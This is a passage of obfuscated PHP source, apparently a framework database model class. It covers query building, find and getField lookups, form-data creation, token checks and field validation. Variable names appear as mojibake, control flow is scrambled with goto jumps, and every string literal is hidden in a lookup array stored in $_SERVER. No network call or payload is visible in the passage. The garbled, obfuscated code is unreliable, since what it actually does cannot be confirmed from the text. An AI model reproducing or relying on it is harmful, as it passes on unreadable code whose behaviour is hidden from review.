$A¡Í‘∞‡Úä; } $this->options[$EÇ≤¢Ç†ƒá[273]] = $Aπ÷Ñ›é€µ; } elseif (!1 === $A¡Í‘∞‡Úä) { $A¡Í‘∞‡Úä = $this->_parseOptions(); return $EÇ≤¢Ç†ƒá[275] . $this->db->buildSelectSql($A¡Í‘∞‡Úä) . $EÇ≤¢Ç†ƒá[276]; } $A¡Í‘∞‡Úä = $this->_parseOptions(); goto bÛ˘…¢ôüÜ; bÛ˘…¢ôüÜ: $FïÌÑØõÉ„ = $this->db->select($A¡Í‘∞‡Úä); if (!1 === $FïÌÑØõÉ„) { return !1; } if (empty($FïÌÑØõÉ„)) { return null; } goto A∞ãØÁÂ„ü; A∞ãØÁÂ„ü: $this->_afterSelect($FïÌÑØõÉ„, $A¡Í‘∞‡Úä); return $FïÌÑØõÉ„; goto Eá˘„˘≥≈ ; Eá˘„˘≥≈ : } protected function _afterSelect(&$fí•¿¬Û…˘, $eÔá◊Ωè€‰) { } public function buildSql($Aƒ˜Ò‰èâπ = array()) { $C±ï‹¿Œ≠ =& $_SERVER[’ÿƒ†ïò]; $Aƒ˜Ò‰èâπ = $this->_parseOptions($Aƒ˜Ò‰èâπ); return $C±ï‹¿Œ≠[275] . $this->db->buildSelectSql($Aƒ˜Ò‰èâπ) . $C±ï‹¿Œ≠[276]; } public function optionsValue($Bçéµ–«ÖÔ = null) { if (is_null($Bçéµ–«ÖÔ)) { return $this->options; } elseif (is_array($Bçéµ–«ÖÔ)) { $this->options = array_merge($this->options, $Bçéµ–«ÖÔ); } } protected function _parseOptions($Bà ËÙí÷Ô = array()) { goto aœ©£≠≠êô; aœ©£≠≠êô: $fŸÔÉ¨ŸﬁË =& $_SERVER[’ÿƒ†ïò]; if (is_array($Bà ËÙí÷Ô)) { $Bà ËÙí÷Ô = array_merge($this->options, $Bà ËÙí÷Ô); } $this->options = array(); goto aªäƒß¶ª—; FøÃÑé§çè: if (isset($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[273]]) && is_array($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[273]]) && !empty($fÍÖıù•Ë”) && !isset($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[280]]) && !isset($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[277]])) { foreach ($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[273]] as $Cıåë—ãÏ• => $B—⁄˘ñ°ìô) { $Cıåë—ãÏ• = trim($Cıåë—ãÏ•); if (in_array($Cıåë—ãÏ•, $fÍÖıù•Ë”, !0)) { if (is_scalar($B—⁄˘ñ°ìô)) { $this->_parseType($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[273]], $Cıåë—ãÏ•); } } elseif (!is_numeric($Cıåë—ãÏ•) && $fŸÔÉ¨ŸﬁË[71] != substr($Cıåë—ãÏ•, 0, 1) && !1 === strpos($Cıåë—ãÏ•, $fŸÔÉ¨ŸﬁË[95]) && !1 === strpos($Cıåë—ãÏ•, $fŸÔÉ¨ŸﬁË[258]) && !1 === strpos($Cıåë—ãÏ•, $fŸÔÉ¨ŸﬁË[281]) && !1 === strpos($Cıåë—ãÏ•, $fŸÔÉ¨ŸﬁË[282])) { unset($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[273]][$Cıåë—ãÏ•]); } } } $this->_options_filter($Bà ËÙí÷Ô); return $Bà ËÙí÷Ô; goto dÏ≤¯‹∑‚ÿ; aªäƒß¶ª—: if (!isset($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[277]])) { $Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[277]] = $this->getTableName(); $fÍÖıù•Ë” = $this->fields; } else { $fÍÖıù•Ë” = $this->getDbFields(); } if (!empty($Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[278]])) { $Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[277]] .= $fŸÔÉ¨ŸﬁË[50] . $Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[278]]; } $Bà ËÙí÷Ô[$fŸÔÉ¨ŸﬁË[279]] = $this->name; goto FøÃÑé§çè; dÏ≤¯‹∑‚ÿ: } protected function _options_filter(&$E§ß≤∑“¨º) { } protected function _parseType(&$AÓë©˘√§ê, $Bö¨‚÷â‹ß) { $D¬ø≤πïãƒ =& $_SERVER[’ÿƒ†ïò]; if (empty($this->options[$D¬ø≤πïãƒ[283]][$D¬ø≤πïãƒ[4] . $Bö¨‚÷â‹ß])) { $EˆéŸëŒ¶ê = strtolower($this->fields[$D¬ø≤πïãƒ[250]][$Bö¨‚÷â‹ß]); if (!1 !== strpos($EˆéŸëŒ¶ê, $D¬ø≤πïãƒ[284])) { } elseif (!1 === strpos($EˆéŸëŒ¶ê, $D¬ø≤πïãƒ[285]) && !1 !== strpos($EˆéŸëŒ¶ê, $D¬ø≤πïãƒ[286])) { $AÓë©˘√§ê[$Bö¨‚÷â‹ß] = intval($AÓë©˘√§ê[$Bö¨‚÷â‹ß]); } elseif (!1 !== strpos($EˆéŸëŒ¶ê, $D¬ø≤πïãƒ[287]) || !1 !== strpos($EˆéŸëŒ¶ê, $D¬ø≤πïãƒ[288])) { $AÓë©˘√§ê[$Bö¨‚÷â‹ß] = floatval($AÓë©˘√§ê[$Bö¨‚÷â‹ß]); } elseif (!1 !== strpos($EˆéŸëŒ¶ê, $D¬ø≤πïãƒ[289])) { $AÓë©˘√§ê[$Bö¨‚÷â‹ß] = (bool) $AÓë©˘√§ê[$Bö¨‚÷â‹ß]; } } } public function find($B∑ƒ–Ö∆á· = array()) { goto D©‹ƒÎù›√; D©‹ƒÎù›√: $FßÙÖ›Ÿ◊Ñ =& $_SERVER[’ÿƒ†ïò]; if (is_numeric($B∑ƒ–Ö∆á·) || is_string($B∑ƒ–Ö∆á·)) { $BôÙôàÎßô[$this->getPk()] = intval($B∑ƒ–Ö∆á·); $this->options[$FßÙÖ›Ÿ◊Ñ[273]] = $BôÙôàÎßô; } $this->options[$FßÙÖ›Ÿ◊Ñ[290]] = 1; goto fﬁ√œÕ‹Éæ; eÈÜéΩ©Ñ·: if (empty($AÆ‚Øœ‡Õ⁄)) { return null; } $this->data = $AÆ‚Øœ‡Õ⁄[0]; $this->_afterFind($this->data, $B∑ƒ–Ö∆á·); goto Bå‚ÌΩÇÎâ; fﬁ√œÕ‹Éæ: $B∑ƒ–Ö∆á· = $this->_parseOptions(); $AÆ‚Øœ‡Õ⁄ = $this->db->select($B∑ƒ–Ö∆á·); if (!1 === $AÆ‚Øœ‡Õ⁄) { return !1; } goto eÈÜéΩ©Ñ·; Bå‚ÌΩÇÎâ: if (!empty($this->options[$FßÙÖ›Ÿ◊Ñ[291]])) { return $this->returnResult($this->data, $this->options[$FßÙÖ›Ÿ◊Ñ[291]]); } return $this->data; goto bïÀÛ‰©ä÷; bïÀÛ‰©ä÷: } protected function _afterFind(&$b±‰û∆Ùã¶, $A‡©ªºÃªó) { } protected function returnResult($FßÉ≈ò§Ò¡, $DÎ®ﬁè®ç§ = '') { $eŒó√àåî† =& $_SERVER[’ÿƒ†ïò]; if ($DÎ®ﬁè®ç§) { if (is_callable($DÎ®ﬁè®ç§)) { return call_user_func($DÎ®ﬁè®ç§, $FßÉ≈ò§Ò¡); } switch (strtolower($DÎ®ﬁè®ç§)) { case $eŒó√àåî†[292]: return json_encode($FßÉ≈ò§Ò¡); case $eŒó√àåî†[293]: return xml_encode($FßÉ≈ò§Ò¡); } } return $FßÉ≈ò§Ò¡; } public function parseFieldsMap($Fª£Ù≈µ´Ê, $B´ªı⁄àîı = 1) { if (!empty($this->_map)) { foreach ($this->_map as $eìïá∞®´Œ => $F‘öè÷Ç§†) { if ($B´ªı⁄àîı == 1) { if (isset($Fª£Ù≈µ´Ê[$F‘öè÷Ç§†])) { $Fª£Ù≈µ´Ê[$eìïá∞®´Œ] = $Fª£Ù≈µ´Ê[$F‘öè÷Ç§†]; unset($Fª£Ù≈µ´Ê[$F‘öè÷Ç§†]); } } else { if (isset($Fª£Ù≈µ´Ê[$eìïá∞®´Œ])) { $Fª£Ù≈µ´Ê[$F‘öè÷Ç§†] = $Fª£Ù≈µ´Ê[$eìïá∞®´Œ]; unset($Fª£Ù≈µ´Ê[$eìïá∞®´Œ]); } } } } return $Fª£Ù≈µ´Ê; } public function setField($e’úıÏÎæê, $D¡Áãƒ≤Úπ = '') { if (is_array($e’úıÏÎæê)) { $C¿™Óﬂù£† = $e’úıÏÎæê; } else { $C¿™Óﬂù£†[$e’úıÏÎæê] = $D¡Áãƒ≤Úπ; } return $this->save($C¿™Óﬂù£†); } public function setAdd($A‚É‡⁄∂÷§, $B¡Ê•Éø≠â = 1) { $Aö«≈õ≤ä˜ =& $_SERVER[’ÿƒ†ïò]; $Aùç¢“¿≈ÿ = $A‚É‡⁄∂÷§ . $Aö«≈õ≤ä˜[294] . $B¡Ê•Éø≠â; if ($B¡Ê•Éø≠â < 0) { $Aùç¢“¿≈ÿ = $A‚É‡⁄∂÷§ . $B¡Ê•Éø≠â; } return $this->setField($A‚É‡⁄∂÷§, array($Aö«≈õ≤ä˜[295], $Aùç¢“¿≈ÿ)); } public function getField($AïÃ—äÌı¥, $Aùà∆âÿåÑ = null) { $A√ÜØéá⁄Õ =& $_SERVER[’ÿƒ†ïò]; $FÍüºÉÖî≤[$A√ÜØéá⁄Õ[271]] = $AïÃ—äÌı¥; $FÍüºÉÖî≤ = $this->_parseOptions($FÍüºÉÖî≤); $AïÃ—äÌı¥ = trim($AïÃ—äÌı¥); if (strpos($AïÃ—äÌı¥, $A√ÜØéá⁄Õ[47])) { if (!isset($FÍüºÉÖî≤[$A√ÜØéá⁄Õ[290]])) { $FÍüºÉÖî≤[$A√ÜØéá⁄Õ[290]] = is_numeric($Aùà∆âÿåÑ) ? $Aùà∆âÿåÑ : $A√ÜØéá⁄Õ[33]; } $eç—∞Ú≤Õâ = $this->db->select($FÍüºÉÖî≤); if (!empty($eç—∞Ú≤Õâ)) { goto E√∫§Ò≠æ; fﬁÇÃˆéìè: $F„Öçú˘≥Ÿ = array_shift($AïÃ—äÌı¥); $D‚∞∞Ë„‡ü = array(); $dŸÿ±õŒø = count($aÜË‹√˘ˆä); goto FÚπôÊÁ≤Ø; E√∫§Ò≠æ: $aÜË‹√˘ˆä = explode($A√ÜØéá⁄Õ[47], $AïÃ—äÌı¥); $AïÃ—äÌı¥ = array_keys($eç—∞Ú≤Õâ[0]); $E¡Æú¥…Ú„ = array_shift($AïÃ—äÌı¥); goto fﬁÇÃˆéìè; FÚπôÊÁ≤Ø: foreach ($eç—∞Ú≤Õâ as $DùèåÃ”©‰) { $døÑÌ£¥√© = $DùèåÃ”©‰[$E¡Æú¥…Ú„]; if (2 == $dŸÿ±õŒø) { $D‚∞∞Ë„‡ü[$døÑÌ£¥√©] = $DùèåÃ”©‰[$F„Öçú˘≥Ÿ]; } else { $D‚∞∞Ë„‡ü[$døÑÌ£¥√©] = is_string($Aùà∆âÿåÑ) ? implode($Aùà∆âÿåÑ, $DùèåÃ”©‰) : $DùèåÃ”©‰; } } return $D‚∞∞Ë„‡ü; goto cÒ€¯ÎäéÔ; cÒ€¯ÎäéÔ: } } else { if (!0 !== $Aùà∆âÿåÑ) { $FÍüºÉÖî≤[$A√ÜØéá⁄Õ[290]] = is_numeric($Aùà∆âÿåÑ) ? $Aùà∆âÿåÑ : 1; } if ($Aùà∆âÿåÑ === $A√ÜØéá⁄Õ[253]) { unset($FÍüºÉÖî≤[$A√ÜØéá⁄Õ[290]]); } $DùèåÃ”©‰ = $this->db->select($FÍüºÉÖî≤); if (!empty($DùèåÃ”©‰)) { if ($Aùà∆âÿåÑ === $A√ÜØéá⁄Õ[253]) { return reset($DùèåÃ”©‰[0]); } if (!0 !== $Aùà∆âÿåÑ && 1 == $FÍüºÉÖî≤[$A√ÜØéá⁄Õ[290]]) { return reset($DùèåÃ”©‰[0]); } foreach ($DùèåÃ”©‰ as $Cã¯ÛÌ¨≤ö) { $Dƒ∂ç¨ß›«[] = $Cã¯ÛÌ¨≤ö[$AïÃ—äÌı¥]; } return $Dƒ∂ç¨ß›«; } } return null; } public function create($B™Ïâ¨≤ˆ¶ = '', $Eª∑Âƒï÷˜ = '') { goto D•ì¶ìØŸõ; Dõ∂ØÙºÈ∑: if (isset($C©ößﬂﬂÈÌ)) { if (is_string($C©ößﬂﬂÈÌ)) { $C©ößﬂﬂÈÌ = explode($Dﬂ‰ùƒü¶á[47], $C©ößﬂﬂÈÌ); } if (think_config($Dﬂ‰ùƒü¶á[296])) { $C©ößﬂﬂÈÌ[] = think_config($Dﬂ‰ùƒü¶á[297]); } foreach ($B™Ïâ¨≤ˆ¶ as $F„Ÿôñ™Ôê => $E∫’†öÒ√ø) { if (!in_array($F„Ÿôñ™Ôê, $C©ößﬂﬂÈÌ)) { unset($B™Ïâ¨≤ˆ¶[$F„Ÿôñ™Ôê]); } } } if (!$this->autoValidation($B™Ïâ¨≤ˆ¶, $Eª∑Âƒï÷˜)) { return !1; } if (!$this->autoCheckToken($B™Ïâ¨≤ˆ¶)) { $this->error = think_lang($Dﬂ‰ùƒü¶á[298]); return !1; } goto dÙ∆¥◊äë›; D•ì¶ìØŸõ: $Dﬂ‰ùƒü¶á =& $_SERVER[’ÿƒ†ïò]; if (empty($B™Ïâ¨≤ˆ¶)) { $B™Ïâ¨≤ˆ¶ = $_POST; } elseif (is_object($B™Ïâ¨≤ˆ¶)) { $B™Ïâ¨≤ˆ¶ = get_object_vars($B™Ïâ¨≤ˆ¶); } if (empty($B™Ïâ¨≤ˆ¶) || !is_array($B™Ïâ¨≤ˆ¶)) { $this->error = think_lang($Dﬂ‰ùƒü¶á[269]); return !1; } goto C≤≤¥»ãëÚ; B∏ÒıÙË›∂: return $B™Ïâ¨≤ˆ¶; goto C›«•––ô; C≤≤¥»ãëÚ: $B™Ïâ¨≤ˆ¶ = $this->parseFieldsMap($B™Ïâ¨≤ˆ¶, 0); $Eª∑Âƒï÷˜ = $Eª∑Âƒï÷˜ ? $Eª∑Âƒï÷˜ : (!empty($B™Ïâ¨≤ˆ¶[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Dﬂ‰ùƒü¶á[271]])) { $C©ößﬂﬂÈÌ = $this->options[$Dﬂ‰ùƒü¶á[271]]; unset($this->options[$Dﬂ‰ùƒü¶á[271]]); } elseif ($Eª∑Âƒï÷˜ == THINK_MODEL_INSERT && isset($this->insertFields)) { $C©ößﬂﬂÈÌ = $this->insertFields; } elseif ($Eª∑Âƒï÷˜ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $C©ößﬂﬂÈÌ = $this->updateFields; } goto Dõ∂ØÙºÈ∑; dÙ∆¥◊äë›: if ($this->autoCheckFields) { $C©ößﬂﬂÈÌ = $this->getDbFields(); foreach ($B™Ïâ¨≤ˆ¶ as $F„Ÿôñ™Ôê => $E∫’†öÒ√ø) { if (!in_array($F„Ÿôñ™Ôê, $C©ößﬂﬂÈÌ)) { unset($B™Ïâ¨≤ˆ¶[$F„Ÿôñ™Ôê]); } elseif (MAGIC_QUOTES_GPC && is_string($E∫’†öÒ√ø)) { $B™Ïâ¨≤ˆ¶[$F„Ÿôñ™Ôê] = stripslashes($E∫’†öÒ√ø); } } } $this->autoOperation($B™Ïâ¨≤ˆ¶, $Eª∑Âƒï÷˜); $this->data = $B™Ïâ¨≤ˆ¶; goto B∏ÒıÙË›∂; C›«•––ô: } public function autoCheckToken($c ÚÉÛÜ‚≠) { $BÿÍ¥ÁÉá’ =& $_SERVER[’ÿƒ†ïò]; if (isset($this->options[$BÿÍ¥ÁÉá’[299]]) && !$this->options[$BÿÍ¥ÁÉá’[299]]) { return !0; } if (think_config($BÿÍ¥ÁÉá’[296])) { $B˜Ë•£öôº = think_config($BÿÍ¥ÁÉá’[297]); if (!isset($c ÚÉÛÜ‚≠[$B˜Ë•£öôº]) || Session::get($B˜Ë•£öôº)) { return !1; } list($E¢úøÖµ¢, $E›” Æå–ë) = explode($BÿÍ¥ÁÉá’[71], $c ÚÉÛÜ‚≠[$B˜Ë•£öôº]); if ($E›” Æå–ë && Session::get($B˜Ë•£öôº . $BÿÍ¥ÁÉá’[95] . $E¢úøÖµ¢) === $E›” Æå–ë) { Session::remove($B˜Ë•£öôº . $BÿÍ¥ÁÉá’[95] . $E¢úøÖµ¢); return !0; } if (think_config($BÿÍ¥ÁÉá’[300])) { Session::remove($B˜Ë•£öôº . $BÿÍ¥ÁÉá’[95] . $E¢úøÖµ¢); } return !1; } return !0; } public function regex($fïÈË«Îœã, $dŒËä°Ô¡) { $Eîµ”ˆ¢Ìû =& $_SERVER[’ÿƒ†ïò]; $B´œø¨öÛã = array($Eîµ”ˆ¢Ìû[301] => $Eîµ”ˆ¢Ìû[302], $Eîµ”ˆ¢Ìû[303] => $Eîµ”ˆ¢Ìû[304], $Eîµ”ˆ¢Ìû[305] => $Eîµ”ˆ¢Ìû[306], $Eîµ”ˆ¢Ìû[307] => $Eîµ”ˆ¢Ìû[308], $Eîµ”ˆ¢Ìû[309] => $Eîµ”ˆ¢Ìû[310], $Eîµ”ˆ¢Ìû[311] => $Eîµ”ˆ¢Ìû[312], $Eîµ”ˆ¢Ìû[313] => $Eîµ”ˆ¢Ìû[314], $Eîµ”ˆ¢Ìû[288] => $Eîµ”ˆ¢Ìû[315], $Eîµ”ˆ¢Ìû[316] => $Eîµ”ˆ¢Ìû[317]); if (isset($B´œø¨öÛã[strtolower($dŒËä°Ô¡)])) { $dŒËä°Ô¡ = $B´œø¨öÛã[strtolower($dŒËä°Ô¡)]; } return preg_match($dŒËä°Ô¡, $fïÈË«Îœã) === 1; } private function autoOperation(&$Eò©˜ù≥Ê , $b±ü‰£‰◊û) { $aÜ€πÙ–åá =& $_SERVER[’ÿƒ†ïò]; if (!empty($this->options[$aÜ€πÙ–åá[318]])) { $F±äˆ∂êÙá = $this->options[$aÜ€πÙ–åá[318]]; unset($this->options[$aÜ€πÙ–åá[318]]); } elseif (!empty($this->_auto)) { $F±äˆ∂êÙá = $this->_auto; } if (isset($F±äˆ∂êÙá)) { foreach ($F±äˆ∂êÙá as $E¢™ß°•—á) { if (empty($E¢™ß°•—á[2])) { $E¢™ß°•—á[2] = THINK_MODEL_INSERT; } if ($b±ü‰£‰◊û == $E¢™ß°•—á[2] || $E¢™ß°•—á[2] == THINK_MODEL_BOTH) { switch (trim($E¢™ß°•—á[3])) { case $aÜ€πÙ–åá[319]: case $aÜ€πÙ–åá[320]: $eÎ¡Ëà÷ä = isset($E¢™ß°•—á[4]) ? (array) $E¢™ß°•—á[4] : array(); if (isset($Eò©˜ù≥Ê [$E¢™ß°•—á[0]])) { array_unshift($eÎ¡Ëà÷ä, $Eò©˜ù≥Ê [$E¢™ß°•—á[0]]); } if ($aÜ€πÙ–åá[319] == $E¢™ß°•—á[3]) { $Eò©˜ù≥Ê [$E¢™ß°•—á[0]] = call_user_func_array($E¢™ß°•—á[1], $eÎ¡Ëà÷ä); } else { $Eò©˜ù≥Ê [$E¢™ß°•—á[0]] = call_user_func_array(array(&$this, $E¢™ß°•—á[1]), $eÎ¡Ëà÷ä); } break; case $aÜ€πÙ–åá[271]: $Eò©˜ù≥Ê [$E¢™ß°•—á[0]] = $Eò©˜ù≥Ê [$E¢™ß°•—á[1]]; break; case $aÜ€πÙ–åá[321]: if ($aÜ€πÙ–åá[33] === $Eò©˜ù≥Ê [$E¢™ß°•—á[0]]) { unset($Eò©˜ù≥Ê [$E¢™ß°•—á[0]]); } break; case $aÜ€πÙ–åá[322]: default: $Eò©˜ù≥Ê [$E¢™ß°•—á[0]] = $E¢™ß°•—á[1]; } if (!1 === $Eò©˜ù≥Ê [$E¢™ß°•—á[0]]) { unset($Eò©˜ù≥Ê [$E¢™ß°•—á[0]]); } } } } return $Eò©˜ù≥Ê ; } protected function autoValidation($dÔô‹·∞Ã¨, $a›ê¥äﬁÜ∆) { $F¬ô¢ò¢Ù =& $_SERVER[’ÿƒ†ïò]; if (!empty($this->options[$F¬ô¢ò¢Ù[323]])) { $B‡Ü¡ò™œº = $this->options[$F¬ô¢ò¢Ù[323]]; unset($this->options[$F¬ô¢ò¢Ù[323]]); } elseif (!empty($this->_validate)) { $B‡Ü¡ò™œº = $this->_validate; } if (isset($B‡Ü¡ò™œº)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B‡Ü¡ò™œº as $E—ÔäÚ⁄…ã => $Fı´Ö≤°√ã) { if (empty($Fı´Ö≤°√ã[5]) || $Fı´Ö≤°√ã[5] == THINK_MODEL_BOTH || $Fı´Ö≤°√ã[5] == $a›ê¥äﬁÜ∆) { if (0 == strpos($Fı´Ö≤°√ã[2], $F¬ô¢ò¢Ù[324]) && strpos($Fı´Ö≤°√ã[2], $F¬ô¢ò¢Ù[325])) { $Fı´Ö≤°√ã[2] = think_lang(substr($Fı´Ö≤°√ã[2], 2, -1)); } $Fı´Ö≤°√ã[3] = isset($Fı´Ö≤°√ã[3]) ? $Fı´Ö≤°√ã[3] : THINK_EXISTS_VALIDATE; $Fı´Ö≤°√ã[4] = isset($Fı´Ö≤°√ã[4]) ? $Fı´Ö≤°√ã[4] : $F¬ô¢ò¢Ù[326]; switch ($Fı´Ö≤°√ã[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($dÔô‹·∞Ã¨, $Fı´Ö≤°√ã)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($F¬ô¢ò¢Ù[33] != trim($dÔô‹·∞Ã¨[$Fı´Ö≤°√ã[0]])) { if (!1 === $this->_validationField($dÔô‹·∞Ã¨, $Fı´Ö≤°√ã)) { return !1; } } break; default: if (isset($dÔô‹·∞Ã¨[$Fı´Ö≤°√ã[0]])) { if (!1 === $this->_validationField($dÔô‹·∞Ã¨, $Fı´Ö≤°√ã)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($e∂Îﬂﬂ≈‹ , $EÍƒè≠©æö) { if (!1 === $this->_validationFieldItem($e∂Îﬂﬂ≈‹ , $EÍƒè≠©æö)) { if ($this->patchValidate) { $this->error[$EÍƒè≠©æö[0]] = $EÍƒè≠©æö[2]; } else { $this->error = $EÍƒè≠©æö[2]; return !1; } } return; } protected function _validationFieldItem($eŸéÌ§å‹, $dàﬂÊÎ¢òÑ) { $aèØ¥˜≠ˆº =& $_SERVER[’ÿƒ†ïò]; switch (strtolower(trim($dàﬂÊÎ¢òÑ[4]))) { case $aèØ¥˜≠ˆº[319]: case $aèØ¥˜≠ˆº[320]: $e≈ ÂúÇÜﬂ = isset($dàﬂÊÎ¢òÑ[6]) ? (array) $dàﬂÊÎ¢òÑ[6] : array(); if (is_string($dàﬂÊÎ¢òÑ[0]) && strpos($dàﬂÊÎ¢òÑ[0], $aèØ¥˜≠ˆº[47])) { $dàﬂÊÎ¢òÑ[0] = explode($aèØ¥˜≠ˆº[47], $dàﬂÊÎ¢òÑ[0]); } if (is_array($dàﬂÊÎ¢òÑ[0])) { foreach ($dàﬂÊÎ¢òÑ[0] as $eàæò≤¡åı) { $aŸÙùåêù∞[$eàæò≤¡åı] = $eŸéÌ§å‹[$eàæò≤¡åı]; } array_unshift($e≈ ÂúÇÜﬂ, $aŸÙùåêù∞); } else { array_unshift($e≈ ÂúÇÜﬂ, $eŸéÌ§å‹[$dàﬂÊÎ¢òÑ[0]]); } if ($aèØ¥˜≠ˆº[319] == $dàﬂÊÎ¢òÑ[4]) { return call_user_func_array($dàﬂÊÎ¢òÑ[1], $e≈ ÂúÇÜﬂ); } else { return call_user_func_array(array(&$this, $dàﬂÊÎ¢òÑ[1]), $e≈ ÂúÇÜﬂ); } case $aèØ¥˜≠ˆº[327]: return $eŸéÌ§å‹[$dàﬂÊÎ¢òÑ[0]] == $eŸéÌ§å‹[$dàﬂÊÎ¢òÑ[1]]; case $aèØ¥˜≠ˆº[328]: if (is_string($dàﬂÊÎ¢òÑ[0]) && strpos($dàﬂÊÎ¢òÑ[0], $aèØ¥˜≠ˆº[47])) { $dàﬂÊÎ¢òÑ[0] = explode($aèØ¥˜≠ˆº[47], $dàﬂÊÎ¢òÑ[0]); } $cíËåŒíÖπ = array(); if (is_array($dàﬂÊÎ¢òÑ[0])) { foreach ($dàﬂÊÎ¢òÑ[0] as $eàæò≤¡åı) { $cíËåŒíÖπ[$eàæò≤¡åı] = $eŸéÌ§å‹[$eàæò≤¡åı]; } } else { $cíËåŒíÖπ[$dàﬂÊÎ¢òÑ[0]] = $eŸéÌ§å‹[$dàﬂÊÎ¢òÑ[0]]; } if (!empty($eŸéÌ§å‹[$this->getPk()])) { $cíËåŒíÖπ[$this->getPk()] = array($aèØ¥˜≠ˆº[329], $eŸéÌ§å‹[$this->getPk()]); } if ($this->where($cíËåŒíÖπ)->find()) { return !1; } return !0; default: return $this->check($eŸéÌ§å‹[$dàﬂÊÎ¢òÑ[0]], $dàﬂÊÎ¢òÑ[1], $dàﬂÊÎ¢òÑ[4]); } } public function check($EõÑ‹È∫Ω‘, $A≠¡ô¡ıø•, $a¢ù‡µªŒÜ = "\x72\x65\147\145\170") { $bÑÁË–ïå– =& $_SERVER[’ÿƒ†ïò]; $a¢ù‡µªŒÜ = strtolower(trim($a¢ù‡µªŒÜ)); switch ($a¢ù‡µªŒÜ) { case $bÑÁË–ïå–[7]: case $bÑÁË–ïå–[330]: $eÆ∆ñ‡Ú‘‚ = is_array($A≠¡ô¡ıø•) ? $A≠¡ô¡ıø• : explode($bÑÁË–ïå–[47], $A≠¡ô¡ıø•); return $a¢ù‡µªŒÜ == $bÑÁË–ïå–[7] ? in_array($EõÑ‹È∫Ω‘, $eÆ∆ñ‡Ú‘‚) : !in_array($EõÑ‹È∫Ω‘, $eÆ∆ñ‡Ú‘‚); case $bÑÁË–ïå–[331]: case $bÑÁË–ïå–[332]: if (is_array($A≠¡ô¡ıø•)) { $bÖÕÁó‰ëµ = $A≠¡ô¡ıø•[0]; $a€ﬂÉûØ˘º = $A≠¡ô¡ıø•[1]; } else { list($bÖÕÁó‰ëµ, $a€ﬂÉûØ˘º) = explode($bÑÁË–ïå–[47], $A≠¡ô¡ıø•); } return $a¢ù‡µªŒÜ == $bÑÁË–ïå–[331] ? $EõÑ‹È∫Ω‘ >= $bÖÕÁó‰ëµ && $EõÑ‹È∫Ω‘ <= $a€ﬂÉûØ˘º : $EõÑ‹È∫Ω‘ < $bÖÕÁó‰ëµ || $EõÑ‹È∫Ω‘ > $a€ﬂÉûØ˘º; case $bÑÁË–ïå–[333]: case $bÑÁË–ïå–[334]: return $a¢ù‡µªŒÜ == $bÑÁË–ïå–[333] ? $EõÑ‹È∫Ω‘ == $A≠¡ô¡ıø• : $EõÑ‹È∫Ω‘ != $A≠¡ô¡ıø•; case $bÑÁË–ïå–[335]: $A‹Ü≤Á⁄⁄ï = mb_strlen($EõÑ‹È∫Ω‘, $bÑÁË–ïå–[336]); if (strpos($A≠¡ô¡ıø•, $bÑÁË–ïå–[47])) { list($bÖÕÁó‰ëµ, $a€ﬂÉûØ˘º) = explode($bÑÁË–ïå–[47], $A≠¡ô¡ıø•); return $A‹Ü≤Á⁄⁄ï >= $bÖÕÁó‰ëµ && $A‹Ü≤Á⁄⁄ï <= $a€ﬂÉûØ˘º; } else { return $A‹Ü≤Á⁄⁄ï == $A≠¡ô¡ıø•; } case $bÑÁË–ïå–[337]: list($AÀá’êøÀã, $Eµåãåºíœ) = explode($bÑÁË–ïå–[47], $A≠¡ô¡ıø•); if (!is_numeric($AÀá’êøÀã)) { $AÀá’êøÀã = strtotime($AÀá’êøÀã); } if (!is_numeric($Eµåãåºíœ)) { $Eµåãåºíœ = strtotime($Eµåãåºíœ); } return NOW_TIME >= $AÀá’êøÀã && NOW_TIME <= $Eµåãåºíœ; case $bÑÁË–ïå–[338]: return in_array(get_client_ip(), explode($bÑÁË–ïå–[47], $A≠¡ô¡ıø•)); case $bÑÁË–ïå–[339]: return !in_array(get_client_ip(), explode($bÑÁË–ïå–[47], $A≠¡ô¡ıø•)); case $bÑÁË–ïå–[326]: default: return $this->regex($EõÑ‹È∫Ω‘, $A≠¡ô¡ıø•); } } public function query($DÜ¡ï‹ç‰Í, $fûÛä‘ª£Ë = false) { $D◊çÛÈïË¬ =& $_SERVER[’ÿƒ†ïò]; if (!is_bool($fûÛä‘ª£Ë) && !is_array($fûÛä‘ª£Ë)) { $fûÛä‘ª£Ë = func_get_args(); array_shift($fûÛä‘ª£Ë); } $DÜ¡ï‹ç‰Í = str_replace(array($D◊çÛÈïË¬[229], $D◊çÛÈïË¬[340]), $D◊çÛÈïË¬[50], $DÜ¡ï‹ç‰Í); $DÜ¡ï‹ç‰Í = $this->parseSql($DÜ¡ï‹ç‰Í, $fûÛä‘ª£Ë); return $this->db->query($DÜ¡ï‹ç‰Í); } public function execute($DÜÜà™Óî, $B•ÀºÈÓ˘ä = false) { if (!is_bool($B•ÀºÈÓ˘ä) && !is_array($B•ÀºÈÓ˘ä)) { $B•ÀºÈÓ˘ä = func_get_args(); array_shift($B•ÀºÈÓ˘ä); } $DÜÜà™Óî = $this->parseSql($DÜÜà™Óî, $B•ÀºÈÓ˘ä); return $this->db->execute($DÜÜà™Óî); } protected function parseSql($f‚∏ö™éŸÀ, $DËñòëˆ›Ω) { $aœ˘π»â’• =& $_SERVER[’ÿƒ†ïò]; if (!0 === $DËñòëˆ›Ω) { $e˜‹ıó‰‹à = $this->_parseOptions(); $f‚∏ö™éŸÀ = $this->db->parseSql($f‚∏ö™éŸÀ, $e˜‹ıó‰‹à); } elseif (is_array($DËñòëˆ›Ω)) { $DËñòëˆ›Ω = array_map(array($this->db, 